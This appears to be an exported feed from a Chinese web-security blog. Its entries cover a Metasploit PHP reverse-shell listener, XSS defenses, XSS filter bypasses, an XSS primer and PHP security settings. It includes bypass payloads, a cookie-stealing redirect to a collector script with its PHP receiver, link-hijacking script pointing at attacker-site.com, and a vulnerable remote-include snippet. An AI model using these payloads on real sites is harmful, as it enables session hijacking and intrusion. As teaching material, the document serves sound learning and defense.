srcset="/img/loading.gif" alt=""></p><p>使用exploit/multi/handler模块</p><p><img src="14.png" srcset="/img/loading.gif" alt=""></p><p>设置payload为php/mterpreter/reverse_tcp</p><p><img src="15.png" srcset="/img/loading.gif" alt=""></p><p>设置LHOST为192.168.0.105</p><p><img src="16.png" srcset="/img/loading.gif" alt=""></p><p>输入exploit即可开始监听，当浏览器访问meter.php之后即可获得shell</p><p><img src="17.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>工具使用</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS的简单防御方式</title>
    <link href="/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/"/>
    <url>/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>一些简单的XSS防御</p><a id="more"></a><h1 id="XSS的简单防御方式"><a href="#XSS的简单防御方式" class="headerlink" title="XSS的简单防御方式"></a>XSS的简单防御方式</h1><h2 id="01-输入检查"><a href="#01-输入检查" class="headerlink" title="01 输入检查"></a>01 输入检查</h2><ol><li>检查用户的输入是否含有敏感字符</li><li>对于用户名、手机号码、邮件、生日等信息的输入进行检查，检查是否符合常见格式</li><li>检查输入字符串是否超过最大长度限制</li></ol><p>输入检查一般在客户端JavaScript和服务端代码实现相同的检查，客户端单一的检查很容易被绕过</p><h2 id="02-输出检查"><a href="#02-输出检查" class="headerlink" title="02 输出检查"></a>02 输出检查</h2><ol><li>对一些特殊字符需要过滤：</li></ol><ul><li>‘</li><li>“</li><li>&lt;&gt;</li><li>\</li><li>:</li><li>&amp;</li><li>#</li></ul><p>可以使用htmlspecialchar()、htmlentities()将特殊字符转为实体</p><ol start="2"><li><p>根据变量输出的位置进行过滤</p><ul><li><p>HTML标签、HTML属性<br>进行HTMLEncode</p></li><li><p>&lt;script&gt;标签、事件<br>进行JavaScriptEncode</p></li><li><p>CSS<br>使用OWASP ESAPI中的encodeForCSS()函数，除字母、数字外的所有字符都被编码成十六进制形式</p></li><li><p>在标签中地址输出<br>直接使用URLEncode进行过滤，但是会把://、.等编码，改变Protocal和Host的含义<br>一般来说，如果变量是整个URL，应该先检查变量是否以http开头（如果不是就自动添加），以避免伪协议的XSS攻击</p><p>之后使用URLEncode编码</p></li></ul></li></ol><h2 id="02-标签事件"><a href="#02-标签事件" class="headerlink" title="02 标签事件"></a>02 标签事件</h2><ol><li>strip_tags(string,allow)<br>对string进行过滤，allow中的字符除外</li><li>编写黑名单白名单进行过滤<br>更推荐白名单的方式，使用正则表达式匹配<br>网上有许多开源的XSS过滤器</li></ol><h2 id="03-HttpOnly"><a href="#03-HttpOnly" class="headerlink" title="03 HttpOnly"></a>03 HttpOnly</h2><p>HttpOnly用于解决XSS的cookie劫持攻击，设置之后JavaScript就无法读取cookie的值，但它只能避免cookie劫持，无法从根本上解决XSS</p><p>一个cookie的使用过程分为三步：</p><ol><li><p>浏览器向服务器发起请求，此时没有cookie</p></li><li><p>服务器响应后发送Set-Cookie头（此时可设置HttpOnly），向客户端浏览器写入Cookie</p></li><li><p>浏览器访问该域下的所有页面都将发送该Cookie（只要Cookie还没过期）</p></li></ol><h2 id="04-富文本"><a href="#04-富文本" class="headerlink" title="04 富文本"></a>04 富文本</h2><p>使用白名单，只允许&lt;a&gt;、&lt;img&gt;、&lt;div&gt;等安全的标签，禁止使用事件和其他不安全的标签</p><p>使用CSS Parser对CSS进行分析，检查CSS中是否有危险代码</p><p>使用一些成熟的开源项目进行检查，如HTMLPurify</p><h2 id="05-DOM-XSS"><a href="#05-DOM-XSS" class="headerlink" title="05 DOM XSS"></a>05 DOM XSS</h2><p>重点观察一些有可能触发XSS的地方的参数是否可以被用户控制</p><ul><li>document.write()</li><li>docement.writeln()</li><li>document.attacheEvent()</li><li>document.location.replace()</li><li>docement.loaction.assign()</li><li>document.referrer</li><li>document.cookie</li><li>window.attachEvent</li><li>window.name</li><li>xxx.innerHTML=</li><li>xxx.outerHTML=</li><li>innerHTML.replace</li><li>localstorage</li><li>XMLHttpRequest返回的数据</li><li>页面中所有inputs框</li></ul><h2 id="06-CSP"><a href="#06-CSP" class="headerlink" title="06 CSP"></a>06 CSP</h2><p>内容安全策略（<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">CSP</a>，Content Security Policy）用于指定哪些内容可执行。将用户输入的部分标为不可执行，就不会产生实际的危害</p><p>配置CSP的方法有两种，HTTP头部的Content-Security-Policy和网页中的&lt;meta&gt;标签</p><p>可配置的内容有：</p><ul><li><strong><code>script-src</code></strong>：外部脚本</li><li><strong><code>style-src</code></strong>：样式表</li><li><strong><code>img-src</code></strong>：图像</li><li><strong><code>media-src</code></strong>：媒体文件（音频和视频）</li><li><strong><code>font-src</code></strong>：字体文件</li><li><strong><code>object-src</code></strong>：插件（比如 Flash）</li><li><strong><code>child-src</code></strong>：框架</li><li><strong><code>frame-ancestors</code></strong>：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）</li><li><strong><code>connect-src</code></strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li><li><strong><code>worker-src</code></strong>：<code>worker</code>脚本</li><li><strong><code>manifest-src</code></strong>：manifest 文件</li></ul><p>每一项有以下几种选项（多个值用空格分开）：</p><ul><li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li><li>路径名：<code>example.org/resources/js/</code></li><li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li><li>协议名：<code>https:</code>、<code>data:</code></li><li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li><li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li></ul><h2 id="07-常用过滤函数"><a href="#07-常用过滤函数" class="headerlink" title="07 常用过滤函数"></a>07 常用过滤函数</h2><pre><code class="hljs php">strip_tags($str, [允许标签])     <span class="hljs-comment">#从字符串中去除 HTML 和 PHP 标记</span>htmlentities($str)           <span class="hljs-comment">#转义html实体</span>html_entity_decode($str)     <span class="hljs-comment">#反转义html实体</span>addcslashes($str, <span class="hljs-string">'字符'</span>)     <span class="hljs-comment">#给某些字符加上反斜杠</span>stripcslashes($str)          <span class="hljs-comment">#去掉反斜杠</span>addslashes ($str )              <span class="hljs-comment">#单引号、双引号、反斜线与 NULL加反斜杠</span>stripslashes($str)              <span class="hljs-comment">#去掉反斜杠</span>htmlspecialchars()              <span class="hljs-comment">#特殊字符转换为HTML实体</span>htmlspecialchars_decode()       <span class="hljs-comment">#将特殊的 HTML 实体转换回普通字符</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS的简单绕过方式</title>
    <link href="/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/"/>
    <url>/XSS%E7%9A%84%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>一些常见的绕过</p><a id="more"></a><h1 id="XSS的简单绕过方式"><a href="#XSS的简单绕过方式" class="headerlink" title="XSS的简单绕过方式"></a>XSS的简单绕过方式</h1><h3 id="基本绕过"><a href="#基本绕过" class="headerlink" title="基本绕过"></a>基本绕过</h3><ol><li><p><strong>简单的探测方式</strong><br>输入一串不容易重复的字符，使用浏览器检查元素的功能查看用户输入被存储的位置，进一步分析闭合方式<br>输入类似*&lt;script “ ‘ OOnn&gt;*的字符串，根据显示内容，观察对特殊字符的过滤情况</p></li><li><p><strong>常用的payload</strong></p><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">confirm(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">prompt(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li><p><strong>双写绕过</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert('xss')<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span></code></pre></li><li><p><strong>伪协议</strong></p><pre><code class="hljs javascript">javascript:alert(<span class="hljs-string">'xss'</span>)</code></pre><p>可以用在a标签中<br>在旧版本ie中也可以用在img标签中</p></li><li><p><strong>利用事件</strong><br>windows事件、form事件、keyboard事件、mouse事件、media事件</p></li><li><p><strong>大小写绕过</strong><br>HTML中不区分大小写，而JS的过滤区分大小写</p> <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">Img</span> <span class="hljs-attr">sRc</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">OnERroR</span>=<span class="hljs-string">"alERt('xss')"</span>/&gt;</span></code></pre></li><li><p><strong>利用引号</strong><br>HTML中对引号不区分，而过滤函数有可能做了区分</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>= <span class="hljs-string">#</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>') /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'#'</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">'alert('</span><span class="hljs-attr">xss</span>')'/&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"#"</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"alert('xss')"</span>/&gt;</span></code></pre></li><li><p><strong>拆分脚本</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">a=<span class="hljs-string">'alert'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">a=a+<span class="hljs-string">'(/xss/)'</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(a)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li><p><strong>使用斜杠代替空格</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>/<span class="hljs-attr">src</span>=<span class="hljs-string">#/onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>')/&gt;</span></code></pre></li><li><p><strong>使用空格、tab和回车分隔开关键</strong>字</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span>    <span class="hljs-attr">src</span>=<span class="hljs-string">#</span>    <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>'<span class="hljs-attr">xss</span>')    /&gt;</span></code></pre></li><li><p><strong>编码绕过</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>(atob(<span class="hljs-string">'base64编码内容'</span>));</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>atob函数执行base64解码功能,eval函数将字符串当作程序执行<br>也可以使用十六进制、unicode等编码<br>类似SQL注入的宽字节注入，XSS也可以用这种方法绕过反斜杠的转义</p></li><li><p><strong>iframe加密脚本</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"data:text/html;base64,这里加你的经过base64加密过的脚本代码"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></code></pre></li><li><p>关注最新的HTML标签，往往没有被过滤</p></li></ol><h3 id="绕过对长度的限制"><a href="#绕过对长度的限制" class="headerlink" title="绕过对长度的限制"></a>绕过对长度的限制</h3><ol><li><p><strong>利用事件缩短长度</strong></p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//缩短为onclick=alert('xss')</code></pre><p>可以绕过一些</p></li><li><p><strong>利用注释绕过</strong><br>当有两个输入框时，可以考虑利用注释</p><pre><code class="hljs html">//第一个输入框"&gt;<span class="hljs-comment">&lt;!--</span><span class="hljs-comment">//第二个输入框</span><span class="hljs-comment">--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>//拼接结果"&gt;<span class="hljs-comment">&lt;!--中间内容被注释--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">alert(<span class="hljs-string">'xss'</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></li><li><p><strong>利用location.hash</strong><br>构造payload如下</p><pre><code class="hljs html"><span class="hljs-tag">&lt; <span class="hljs-attr">...</span> <span class="hljs-attr">onclik</span>=<span class="hljs-string">"eval(location.hash.substr(1))"</span> /&gt;</span></code></pre><p>URL为: <a href="http://xxx.com/yyy.html/#alert(1)" target="_blank" rel="noopener">http://xxx.com/yyy.html/#alert(1)</a><br>从#起即为location.hash<br>substr(1)用于去掉#</p><p>location.hash的内容不会被日志记录，更加隐蔽</p></li><li><p><strong>利用window.name</strong><br>对当前窗口的window.name赋值，没有特殊字符的限制，而且不受同源策略的影响<br>在本地构造payload如下</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">  <span class="hljs-built_in">window</span>.name=<span class="hljs-string">"alert(document.cookie)"</span></span><span class="actionscript">  location.href=<span class="hljs-string">"目标地址"</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>跳转到目标地址后，只需要执行</p><pre><code class="hljs html">eval(name);</code></pre><p>由于window.name 可以跨域，就成功执行了</p><pre><code class="hljs html">eval(alert(document.cookie))</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞简介</title>
    <link href="/XSS%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/"/>
    <url>/XSS%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B/</url>
    
    <content type="html"><![CDATA[<p>关于XSS的简单介绍</p><a id="more"></a><h1 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h1><h2 id="01-原理"><a href="#01-原理" class="headerlink" title="01 原理"></a>01 原理</h2><ol><li><p><strong>介绍</strong><br>XSS（cross site scripting）跨站脚本攻击，发生在服务器</p><p>恶意攻击者往web页面里插入恶意script代码，当用户浏览该页面时，代码就会被执行</p></li><li><p><strong>实现过程</strong></p><ol><li>攻击者将恶意代码插入到服务器</li><li>其他用户无防备的情况下访问服务器</li><li>服务器将含有恶意代码的网页响应发送给客户端</li><li>用户的客户端中执行了恶意代码<br><img src="1.png" srcset="/img/loading.gif" alt=""></li></ol></li><li><p><strong>可能存在XSS的地方</strong><br>留言板，聊天室，搜索等<br>如果用户的输入能在网页上显示，就很可能存在XSS<br>如果在URL中提交的参数值，在页面中显示，很有可能就存在XSS<br>如果在表单中提交的参数值，在页面中显示，很有可能就存在XSS<br>如果HTTP自定义头中提交的参数，在页面中显示，很有可能就存在XSS</p></li><li><p><strong>XSS的危害</strong></p><ol><li>盗取用户账号</li><li>盗取用户cookie</li><li>劫持用户会话，执行其他操作</li><li>进行跳转、弹窗等</li><li>传播蠕虫</li><li>DDoS</li></ol><p>用一句话总结：前端页面能做的事情XSS都能做</p></li></ol><h2 id="02-分类"><a href="#02-分类" class="headerlink" title="02 分类"></a>02 分类</h2><h3 id="根据效果分类"><a href="#根据效果分类" class="headerlink" title="根据效果分类"></a>根据效果分类</h3><ol><li><p><strong>反射型XSS</strong><br>又称非持续型XSS，往往具有一次性，常发生在输入框中，将用户输入的数据“反射”给浏览器，黑客需要诱使用户点击一个恶意链接才能共计成功<br>当用户输入xss脚本&lt;script&gt;alert(“xss”);&lt;/script&gt;，如果出现弹窗，就说明存在XSS<br>常用探测方式：</p><ul><li>alert 弹出框</li><li>confirm 确认框</li><li>prompt 输入框</li></ul></li><li><p><strong>存储型XSS</strong><br>又称持久型XSS，攻击脚本存储在目标服务器等数据库中，隐蔽性强，常常发生在留言板中<br>如用户在留言板中输入&lt;script&gt;alert(document.cookie);&lt;/script&gt;<br>其他用户访问留言板时就会出现弹窗并显示cookie值<br>存储型XSS与反射型XSS的区别在于<strong>数据是否保存在服务器端</strong></p></li><li><p><strong>DOM型XSS</strong><br>DOM全称Document Object Model，使用DOM动态访问更新文档的内容、结构及样式</p><p>攻击者的payload修改受害浏览器页面的DOM树，修改是在本地执行的，不会上传到服务器，因此DOM XSS难以检测</p><p>服务器不会处理攻击者脚本，而是用户浏览器处理这个响应时，DOM对象就会处理XSS代码，触发XSS漏洞，可以看做一种特殊的反射型XSS</p></li></ol><h3 id="根据发生的位置分类"><a href="#根据发生的位置分类" class="headerlink" title="根据发生的位置分类"></a>根据发生的位置分类</h3><ol><li><strong>GET型URL中的XSS</strong><br>如果在URL中提交的参数值，在页面中显示，很有可能就存在XSS</li><li><strong>POST型表单中的XSS</strong><br>如果在表单中提交的参数值，在页面中显示，很有可能就存在XSS</li><li><strong>JSON中的XSS</strong><br>JSON是一种轻量级的数据交换格式，易于人阅读和编写，也易于机器解析和生成，并有效的提升网络传输效率<br>JSON最常用的格式是对象的键值对<br>{“key1”:”value1”,”key2”:”value2};<br>通过闭合JSON插入XSS</li><li><strong>自定义HTTP头中的XSS</strong><br>如果HTTP自定义头中提交的参数，在页面中显示，很有可能就存在XSS<br>可以通过burpsuite抓包，修改HTTP头插入XSS</li></ol><h3 id="根据接口分类"><a href="#根据接口分类" class="headerlink" title="根据接口分类"></a>根据接口分类</h3><ol><li><strong>DOM base XSS</strong></li><li><strong>非DOM XSS</strong></li></ol><h2 id="04-DOM型XSS"><a href="#04-DOM型XSS" class="headerlink" title="04 DOM型XSS"></a>04 DOM型XSS</h2><p><img src="http://blog.nsfocus.net/wp-content/uploads/2017/09/0e1665fdd991958bb232d36444f9b191.png" srcset="/img/loading.gif" alt="img"></p><pre><code class="hljs javascript"><span class="hljs-comment">//常见的输入点：</span><span class="hljs-built_in">document</span>.URL<span class="hljs-built_in">document</span>.URLUnencoded<span class="hljs-built_in">document</span>.location(and many <span class="hljs-keyword">of</span> its properties)<span class="hljs-built_in">document</span>.referrer<span class="hljs-built_in">window</span>.location(and many <span class="hljs-keyword">of</span> its properties)<span class="hljs-comment">//常见的输出点：</span><span class="hljs-built_in">document</span>.write(…)<span class="hljs-built_in">document</span>.writeln(…)<span class="hljs-built_in">document</span>.body.innerHtml = …<span class="hljs-comment">//直接修改DOM树：</span><span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].action = … (and various other collections)<span class="hljs-built_in">document</span>.attachEvent(…)<span class="hljs-built_in">document</span>.create…(…)<span class="hljs-built_in">document</span>.execCommand(…)<span class="hljs-built_in">document</span>.body.…(accessing the DOM through the body object)<span class="hljs-built_in">window</span>.attachEvent(…)<span class="hljs-comment">//替换document URL：</span><span class="hljs-built_in">document</span>.location = … (and assigning to location’ s href, host and hostname)<span class="hljs-built_in">document</span>.location.hostname = …<span class="hljs-built_in">document</span>.location.replace(…)<span class="hljs-built_in">document</span>.location.assign(…)<span class="hljs-built_in">document</span>.URL = …<span class="hljs-built_in">window</span>.navigate(…)<span class="hljs-comment">//打开或修改新窗口：</span><span class="hljs-built_in">document</span>.open(…)<span class="hljs-built_in">window</span>.open(…)<span class="hljs-built_in">window</span>.location.href = … (and assigning to location’ s href, host and hostname)<span class="hljs-comment">//直接执行脚本：</span><span class="hljs-built_in">eval</span>(…)<span class="hljs-built_in">window</span>.execScript(…)<span class="hljs-built_in">window</span>.setInterval(…)<span class="hljs-built_in">window</span>.setTimeout(…)</code></pre><h2 id="05-应用"><a href="#05-应用" class="headerlink" title="05 应用"></a>05 应用</h2><ol><li><p><strong>盗取cookie</strong><br>&lt;script&gt;document.location=’<a href="http://ip/cookie.php？cookie=&#39;+document.cookie\" target="_blank" rel="noopener">http://ip/cookie.php？cookie=&#39;+document.cookie\</a></script><br>其中cookie.php为自己编写的接收cookie的代码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  $cookie=$_GET[<span class="hljs-string">'cookie'</span>];file_put_contents(<span class="hljs-string">'cookie.txt'</span>,$cookie);<span class="hljs-meta">?&gt;</span></code></pre><p>通过重定向将用户的cookie发送给攻击者，随后攻击者就可以使用cookie进行下一步攻击，如登录</p></li><li><p><strong>篡改链接</strong></p><pre><code class="hljs javascript">&lt;script&gt;  <span class="hljs-built_in">window</span>.onload=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-keyword">var</span> link=<span class="hljs-built_in">document</span>.getElementByTagName(<span class="hljs-string">"a"</span>);  <span class="hljs-keyword">for</span> (j=<span class="hljs-number">0</span>;j&lt;link.length;j++)&#123;    link[j].href=<span class="hljs-string">"http://attacker-site.com/"</span>;&#125;&#125;&lt;<span class="hljs-regexp">/scipt&gt;</span></code></pre><p>当窗口加载时，执行匿名函数<br>使用for循环获取所有a标签，将链接替换为攻击者的url，达到了网页跳转，刷流量的目的</p></li><li><p><strong>结合beef的攻击</strong><br>通过重定向，运行beef生成的payload，达到浏览器劫持的目的，进行进一步攻击</p></li><li><p><strong>结合msf的攻击</strong><br>通过重定向，运行msf生成的payload，与受害者建立session，获得shell，进行进一步攻击</p></li><li><p><strong>结合钓鱼网站的攻击</strong><br>使用set工具制作一个克隆的钓鱼网站，在真实网站中添加跳转的XSS，使受害者跳转到钓鱼网站，获取用户输入的信息</p></li><li><p><strong>xss自动化挖掘工具</strong><br>xsser、xsstrike</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB安全</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP配置中的安全选项</title>
    <link href="/PHP%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9/"/>
    <url>/PHP%E9%85%8D%E7%BD%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>PHP的一些安全配置</p><a id="more"></a><h1 id="PHP配置中的安全选项"><a href="#PHP配置中的安全选项" class="headerlink" title="PHP配置中的安全选项"></a>PHP配置中的安全选项</h1><h2 id="01-PHP-INI-常量定义"><a href="#01-PHP-INI-常量定义" class="headerlink" title="01 PHP_INI_*常量定义"></a>01 PHP_INI_*常量定义</h2><table><thead><tr><th>常量</th><th>含义</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>该配置选项可以在PHP脚本或者Windows注册表配置</td></tr><tr><td>PHP_INI_PREDIR</td><td>该配置选项可以在php.ini, .htaccess或httpd.conf中配置</td></tr><tr><td>PHP_INI_SYSTEM</td><td>该配置选项可以在php.ini, 或httpd.conf中配置</td></tr><tr><td>PHP_INI_ALL</td><td>该配置选项可以在任何地方配置</td></tr><tr><td>php.ini only</td><td>该配置选项仅在php.ini中配置</td></tr></tbody></table><p>PHP配置指令修改范围决定了PHP指令在何时何地及是否可被更改。手册中的每个指令都有其所属的模式。例如有些指令可以在 PHP 脚本中用 ini_set()来设定，而有些则只能在 php.ini 或 httpd.conf 中</p><h2 id="02-相关配置"><a href="#02-相关配置" class="headerlink" title="02 相关配置"></a>02 相关配置</h2><ol><li><p>register_globals(全局变量注册开关)</p><p>PHP版本：&lt; 4.2.3 : 设置为PHP_INI_ALL</p><p>​                    5.3.0起不推荐使用</p><p>​                    5.4.0起被移除<br>当选项为On，会将GET、POST等方式提交的参数注册成全局变量并且初始化值为该参数对应的值</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'cmd'</span>]))&#123;      <span class="hljs-keyword">if</span>($cmd==<span class="hljs-string">'whoami'</span>)&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">'True'</span>      &#125;    &#125;<span class="hljs-keyword">else</span>&#123;      <span class="hljs-keyword">echo</span> <span class="hljs-string">"?cmd=whoami"</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>通过GET方式在URL中提交?cmd=whoami ,网页输出True</p></li><li><p>allow_url_include(允许包含远程文件)<br>PHP版本： 5.2.0之后被默认设置为off，配置范围是PHP_INI_ALL<br>当选项为On时可以直接包含远程文件，造成文件包含漏洞</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">include</span> $_GET[<span class="hljs-string">'file'</span>];<span class="hljs-meta">?&gt;</span></code></pre><p>通过GET方式在URL中提交?file=<a href="http://xxx.com/file.txt就可以读取文件" target="_blank" rel="noopener">http://xxx.com/file.txt就可以读取文件</a><br>即使后缀名不是PHP，也可以执行其中的PHP代码</p><p>类似的还有allow_url_fopen(),配置是否允许打开远程文件,影响较小</p></li><li><p>magic_quotes_gpc(魔术引号自动过滤)</p><p>PHP版本：5.3之后不推荐使用，5.4之后被取消</p><p>​                   &lt; 4.2.3时配置范围是PHP_INI_ALL</p><p>​                    &gt; 4.2.3时配置范围是PHP_INI_PREDIR<br>当选项为On时，会自动在GET、POST、COOKIE变量中的单引号、双引号、反斜杠和空字符前加上反斜杠进行转义</p><p>在PHP5中不过滤$_SERVER变量，因此client-ip、referer等漏洞能被利用</p><p>开启时，如果不存在编码（如宽字节注入）或其他特殊绕过，很多漏洞就无法使用</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>  <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'a'</span>]<span class="hljs-meta">?&gt;</span></code></pre><p>传入 ?a=1’<br>输出位1\‘</p></li><li><p>magic_quotes_runtime(魔术引号自动过滤)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL<br>类似，在单引号、双引号、反斜杠和空字符前加上反斜杠进行转义<br>但它的处理对象时从数据库或文件中读取的数据</p><pre><code class="hljs txt">&#x2F;&#x2F; test.txt1&#39;2&quot;3\4</code></pre><pre><code class="hljs php"><span class="hljs-comment">// mqr.php</span><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">echo</span> file_get_contents(<span class="hljs-string">"test.txt"</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>输出结果为 1\‘2\“3\\4</p></li><li><p>magic_quotes_sybase(魔术引号自动过滤)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL</p><p>当选项为On时，会自动在GET、POST、COOKIE变量中的空字符前加上反斜杠进行转义，会将单引号变成双引号</p><p>此选项开启时，会覆盖magic_quotes_gpc=on</p> <pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>  <span class="hljs-keyword">echo</span> $_GET[<span class="hljs-string">'a'</span>]<span class="hljs-meta">?&gt;</span></code></pre><p>传入 ?a=1’2”3\4%005<br>输出位1’’2”3\4\05</p></li><li><p>safe_mode(安全模式)</p><p>PHP版本：5.4之后被取消，配置范围是PHP_INI_ALL</p><p>当选项为On时，会有两中限制：</p><ul><li>用户无法对其他所有者所有的文件进行包含、删除等操作<br>可以通过配置safe_mode_include_dir和safe_mode_exec_dir来设置允许操作的路径</li><li>无法通过system()、popen()、exec()、反引号来执行命令或程序<br>可以将需要使用的脚本放在同一目录下，并使用safe_mode_exec_dir配置可以执行的目录</li></ul></li><li><p>open_basedir(可访问目录)<br>PHP版本：&lt; 5.2.3 : 设置为PHP_INI_SYSTEM</p><pre><code>\&gt;=5.2.3 : 设置为PHP_INI_SYSTEM</code></pre><p>用于设置PHP可访问的目录，可以用分号分隔多个目录<br>如果设置为 open_basedir=/www/a ，/www/a 和 /www/ab 都可以访问<br>因此需要设置为 open_basedir=/www/a/</p></li><li><p>disable_functions(禁用函数)<br>配置范围是php.ini only，用逗号分隔多个函数名</p></li><li><p>display_errors、error_reporting(错误显示)<br>配置范围是PHP_INI_ALL<br>display_errors用于配置是否显示错误信息<br>当display_errors开启时，可以用error_reporting设置显示的级别</p><p><img src="1.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 关闭所有PHP错误报告</span>error_reporting(<span 